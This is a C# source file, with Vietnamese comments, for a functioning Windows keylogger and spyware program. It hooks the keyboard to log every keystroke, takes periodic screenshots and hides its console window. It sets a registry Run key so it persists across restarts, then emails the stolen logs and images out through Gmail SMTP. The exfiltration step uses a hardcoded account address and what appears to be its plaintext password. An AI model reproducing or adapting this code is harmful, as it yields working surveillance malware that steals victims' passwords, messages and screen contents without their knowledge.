using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {
        #region hook key board
        private const int WH_KEYBOARD_LL = 13; // mã nhả phím
        private const int WM_KEYDOWN = 0x0100; // mã đè phím

        private static LowLevelKeyboardProc _proc = HookCallback; // tạo delegate HookCallback
        private static IntPtr _hookID = IntPtr.Zero; // để lưu id(handel) của các control trong hdl

        private static string logName = "Log_";
        private static string logExtendtion = ".txt";

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        //  cài đặt một hook procedure vào một hook chain.
        private static extern IntPtr SetWindowsHookEx(
            int idHook,
            LowLevelKeyboardProc lpfn,
            IntPtr hMod,
            uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]

        //gỡ hook procedure ra khỏi hook chain được cài đặt bởi SetWindowsHookEx.
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        //wParam sẽ có giá trị của phím được nhấn, lParam sẽ chứa các thông tin về số lần nhấn, các phím tắt, trạng thái phím,…
        //chuyển quyền điều khiển cùng các thông tin hook cho hook procedure kế tiếp trong hook chain
        private static extern IntPtr CallNextHookEx(
            IntPtr hhk,
            int nCode,
            IntPtr wParam,
            IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        //lấy ra handel của module đang chạy
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Delegate a LowLevelKeyboardProc to use user32.dll
        /// </summary>
        private delegate IntPtr LowLevelKeyboardProc(
            int nCode,
            IntPtr wParam,
            IntPtr lParam);

        /// <summary>
        /// Set hook into all current process
        /// </summary>
        /// lấy ra tất cả các project đang chạy 
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule) // lấy ra mainmodule của các chưng trình đang chạy
                {
                    return SetWindowsHookEx(
                        WH_KEYBOARD_LL,
                        proc, // thả mồi cầu để lẫy ra handel của thèn đang chạy
                        GetModuleHandle(curModule.ModuleName),
                        0);
                }
            }
        }

        /// <summary>
        /// Every time the OS call back pressed key. Catch them 
        /// then cal the CallNextHookEx to wait for the next key
        /// </summary>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) // kt nếu param trả về có phải nhấn phím hay ko
            {
                int vkCode = Marshal.ReadInt32(lParam); // lấy dữ liệu (ko mấy dữ liệu của người dùng)

                CheckHotKey(vkCode); // kiễm tra kí tự vừa nhập (ẩn/ hiện màn hình console)
                WriteLog(vkCode); // ghi log cái mã vừa lấy dc
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam); // call lại để lấy dữ liệu tiếp 
        }

        /// <summary>
        /// git ra file log.txt
        /// </summary>
        static void WriteLog(int vkCode)
        {
            Console.WriteLine((Keys)vkCode);
            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion; // lưu dữ liệu theo ngày
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write((Keys)vkCode); // ghi dữ liệu
            sw.Close(); // đóng file
        }

        /// <summary>
        /// Start hook key board and hide the key logger
        /// Key logger only show again if pressed right Hot key
        /// </summary>
        /// gop lại
        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        // kiễm tra key vừa nhập để ẩn, hiện màn hình console
        static bool isHotKey = false;
        static bool isShowing = false;
        static Keys previoursKey = Keys.Separator;

        static void CheckHotKey(int vkCode)
        {
            if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.K)
                isHotKey = true;

            if (isHotKey)
            {
                if (!isShowing)
                {
                    DisplayWindow();
                }
                else
                    HideWindow();

                isShowing = !isShowing;
            }

            previoursKey = (Keys)vkCode;
            isHotKey = false;
        }
        #endregion

        #region Capture
        static string imagePath = "Image_";
        static string imageExtendtion = ".png";

        static int imageCount = 0; // đếm số lượng hình
        static int captureTime = 1000; // sau 1s sẽ chụp màn hình

        /// <summary>
        /// Capture al screen then save into ImagePath
        /// </summary>
        static void CaptureScreen()
        {
            //Create a new bitmap.
            var bmpScreenshot = new Bitmap(
                Screen.PrimaryScreen.Bounds.Width,
                Screen.PrimaryScreen.Bounds.Height,
                PixelFormat.Format32bppArgb);       // lấy ma trận điễm ảnh trên màn hình


            var gfxScreenshot = Graphics.FromImage(bmpScreenshot); // tạo graphics thừ ma trận ảnh để vẽ hình

            // Chụp ảnh màn hình từ góc trên bên trái đến góc dưới cùng bên phải
            gfxScreenshot.CopyFromScreen(
                Screen.PrimaryScreen.Bounds.X,
                Screen.PrimaryScreen.Bounds.Y,
                0,
                0,
                Screen.PrimaryScreen.Bounds.Size,
                CopyPixelOperation.SourceCopy);

            // đường dẫn để lưu ảnh theo ngày
            string directoryImage = imagePath + DateTime.Now.ToLongDateString();

            if (!Directory.Exists(directoryImage))  // kt folder có tồn tại chưa
            {
                Directory.CreateDirectory(directoryImage);          // chưa tồn tại thì tạo mới
            }

            // tạo đường dẫn tới để lưu trữ ảnh để lưu trữ
            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + imageCount, imageExtendtion);

            // lưu hình ảnh
            try
            {
                bmpScreenshot.Save(imageName, ImageFormat.Png);
            }
            catch
            {
            }

            imageCount++;       // tăng số ảnh lên 1
        }
        #endregion

        #region Timer
        static int interval = 1;

        static void StartTimmer()
        {
            Thread thread = new Thread(
                () =>
                {
                    while (true)
                    {
                        Thread.Sleep(1);

                        // kiễm tra interval có = 1s: chụp màn hình = 2000s thì gởi mail
                        if (interval % captureTime == 1000)
                            CaptureScreen();

                        if (interval % mailTime == 0)
                            SendMail();

                        interval++; // tăng interval lên 1

                        if (interval >= 1000000) // nếu interval lớn quá thì set lại về 0
                            interval = 0;
                    }
                });
            thread.IsBackground = true;
            thread.Start();
        }
        #endregion

        #region Windows
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // hide window code
        const int SW_HIDE = 0;

        // show window code
        const int SW_SHOW = 5;

        static void HideWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }

        static void DisplayWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_SHOW);
        }
        #endregion

        #region Registry that open with window
        static void StartWithOS()
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            try
            {
                regkey.SetValue("Index", keyvalue);
                regstart.SetValue("ListenToUser", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                regkey.Close();
            }
            catch (Exception ex)
            {
            }
        }
        #endregion

        #region Mail
        static int mailTime = 2000; // sau 2s sẽ gởi mail

        static void SendMail()
        {
            //email body
            StringBuilder sb = new StringBuilder();

            string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;

            if (File.Exists(logFile))
            {
                StreamReader sr = new StreamReader(logFile);

                sb.Append(sr.ReadToEnd());

                sr.Close();
            }

            using (SmtpClient sender = new SmtpClient())
            {
                sender.EnableSsl = true;
                sender.Host = "smtp.gmail.com";
                sender.Port = 587;
                sender.UseDefaultCredentials = false;
                sender.Credentials
                    = new NetworkCredential("ngocphuc2015.np@gmail.com", "buingochuy");
                MailMessage mailMessage = new MailMessage(
                    "ngocphuc2015.np@gmail.com",
                    "ngocphuc2015.np@gmail.com",
                    "Thông tin thu thập được",
                    sb.ToString());
                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
                try
                {
                    DirectoryInfo image = new DirectoryInfo(directoryImage);

                    foreach (FileInfo item in image.GetFiles("*.png"))
                    {
                        if (File.Exists(directoryImage + "\\" + item.Name))
                            mailMessage.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
                    }
                }
                catch (Exception) { }


                mailMessage.IsBodyHtml = true;

                //mailMessage.CC.Add("admin@gmail.com");
                try
                {
                    sender.Send(mailMessage);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }
        #endregion

        public static void Main(string[] args)
        {
            StartWithOS();
            HideWindow();

            StartTimmer();
            HookKeyboard();
        }
    }
}